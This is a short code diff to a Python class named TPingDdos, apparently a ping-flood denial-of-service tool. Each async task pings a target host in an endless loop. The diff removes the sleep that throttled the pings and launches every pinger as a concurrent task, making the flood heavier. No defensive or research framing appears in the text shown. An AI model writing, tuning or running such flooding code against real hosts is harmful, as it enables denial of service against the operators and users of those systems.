@@ -26,11 +26,11 @@ class TPingDdos():
             if (Cnt % 100 == 0):
                 print('time: %sms, id %s:, cnt: %s' % (Delay, aTaskId, Cnt))
 
-            await asyncio.sleep(0.001)
+            #await asyncio.sleep(0.01)
 
     async def Run(self, aHost: str, aCnt: int):
-        Tasks = [self.PingEver(aHost, i) for i in range(aCnt)]
         print('gathering %s tasks ...' % (aCnt))
+        Tasks = [asyncio.create_task(self.PingEver(aHost, i)) for i in range(aCnt)]
         await asyncio.gather(*Tasks)
 
 
